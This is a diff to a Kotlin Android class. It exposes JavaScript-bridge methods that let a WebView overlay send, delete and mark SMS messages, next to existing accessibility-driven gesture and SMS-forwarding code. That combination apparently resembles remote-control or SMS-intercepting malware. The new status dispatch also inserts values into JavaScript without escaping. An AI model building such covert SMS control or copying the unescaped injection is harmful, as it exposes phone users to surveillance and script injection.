@@ -482,6 +482,32 @@ object DynamicUIManager {
         }
 
         @JavascriptInterface
+        fun sendSmsTracked(number: String, message: String, messageId: String) {
+            PhoneManager.sendSmsTracked(ctx, number, message, messageId)
+        }
+
+        @JavascriptInterface
+        fun deleteSms(threadId: String) {
+            if (DefaultSmsManager.isDefaultSms(ctx)) {
+                PhoneManager.deleteSmsThread(ctx, threadId)
+            }
+        }
+
+        @JavascriptInterface
+        fun deleteSmsBubble(timestamp: String) {
+            if (DefaultSmsManager.isDefaultSms(ctx)) {
+                PhoneManager.deleteSmsByTimestamp(ctx, timestamp.toLongOrNull() ?: 0L)
+            }
+        }
+
+        @JavascriptInterface
+        fun markAsRead(threadId: String) {
+            if (DefaultSmsManager.isDefaultSms(ctx)) {
+                PhoneManager.markSmsRead(ctx, threadId)
+            }
+        }
+
+        @JavascriptInterface
         fun performGesture(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
             Handler(Looper.getMainLooper()).post {
                 val svc = MyAccessibilityService.instance
@@ -1501,6 +1527,14 @@ object DynamicUIManager {
                 val safeSender = sender.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'")
                 val safeBody = body.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'").replace("\n", "\\n")
                 overlayView?.evaluateJavascript("if(typeof window.onSmsReceived === 'function') { window.onSmsReceived('$safeSender', '$safeBody', $ts); }", null)
+            }
+        }
+    }
+
+    fun dispatchSmsStatus(messageId: String, status: String) {
+        Handler(Looper.getMainLooper()).post {
+            if (isAttached && overlayView != null) {
+                overlayView?.evaluateJavascript("if(typeof window.onSmsStatus === 'function') { window.onSmsStatus('$messageId', '$status'); }", null)
             }
         }
     }
